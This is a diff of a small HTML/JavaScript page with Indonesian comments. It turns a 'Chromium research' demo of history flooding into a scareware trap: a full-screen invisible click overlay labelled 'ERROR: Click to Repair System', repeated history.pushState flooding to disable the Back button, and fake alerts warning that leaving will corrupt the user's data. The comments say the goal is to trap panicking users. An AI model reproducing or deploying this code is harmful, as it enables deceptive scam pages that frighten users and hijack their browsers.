@@ -1,58 +1,46 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Research: User Activation Persistence</title>
+    <title>Interaction Research</title>
     <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn-start {
-            padding: 20px 40px; font-size: 1.2rem; background: #007bff;
-            color: white; border: none; border-radius: 10px; cursor: pointer;
+        body { margin: 0; background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
+        /* Tombol transparan raksasa di seluruh layar */
+        #trap {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0,0,0,0.1); display: flex; align-items: center;
+            justify-content: center; z-index: 999; cursor: pointer;
         }
-        #log { margin-top: 30px; color: #00ff00; font-family: monospace; }
+        .msg { padding: 20px; border: 2px solid #00ff00; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <h2>Chromium Research: Interaction Leak</h2>
-    <p>Tekan tombol di bawah untuk simulasi "Secure Session".</p>
-    
-    <button class="btn-start" id="triggerBtn">START SESSION</button>
-
-    <div id="log">Status: Waiting for User Gesture...</div>
+    <div id="trap">
+        <div class="msg">ERROR: Click to Repair System</div>
+    </div>
 
     <script>
-        const btn = document.getElementById('triggerBtn');
-        const log = document.getElementById('log');
+        const trap = document.getElementById('trap');
+        let counter = 0;
 
-        btn.onclick = function() {
-            log.innerHTML = "[!] Activation Captured. Locking History...";
-
-            // 1. HISTORY BOMBING (Nge-trap tombol Back)
-            // Kita masukkan 100 entri ke history dalam sekejap
-            for (let i = 0; i < 100; i++) {
-                window.history.pushState({page: i}, `Page ${i}`, `?session_id=${Math.random().toString(36).substring(7)}`);
+        // Tiap kali user klik (karena panik atau mau repair), kita jebloskan ke history
+        trap.onclick = function() {
+            counter++;
+            for (let i = 0; i < 20; i++) {
+                window.history.pushState({p: i}, "", `?fix_attempt=${counter}_${i}`);
             }
+            alert("System Repairing... Please wait (" + counter + "/10)");
+        };
 
-            // 2. FULLSCREEN TRIGGER
-            // Memanfaatkan "User Activation" yang sama untuk masuk mode Fullscreen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+        // KUNCINYA: Saat user tekan Back, kita deteksi dan paksa klik lagi
+        window.onpopstate = function() {
+            // Kita kasih alert biar user harus KLIK 'OK' (interaksi baru!)
+            // Ini akan mereset 'User Activation' dan memvalidasi history baru
+            alert("Warning: Leaving this page may corrupt your data! Click OK to stay safe.");
+            for (let i = 0; i < 10; i++) {
+                window.history.pushState(null, "", "?persistence=" + Math.random());
             }
-
-            // 3. RE-LOCK LOGIC (Mirip Issue 421511847)
-            // Jika user coba Back, kita paksa PushState lagi secara asinkron
-            window.onpopstate = function(event) {
-                log.innerHTML += "<br>[!] Back Attempt Detected! Re-injecting History...";
-                for (let j = 0; j < 10; j++) {
-                    window.history.pushState(null, "", window.location.href);
-                }
-                // Opsional: Getarkan HP agar user bingung
-                if (navigator.vibrate) navigator.vibrate(200);
-            };
-
-            log.innerHTML += "<br>[+] History Locked. Try to go BACK now!";
         };
     </script>
 </body>
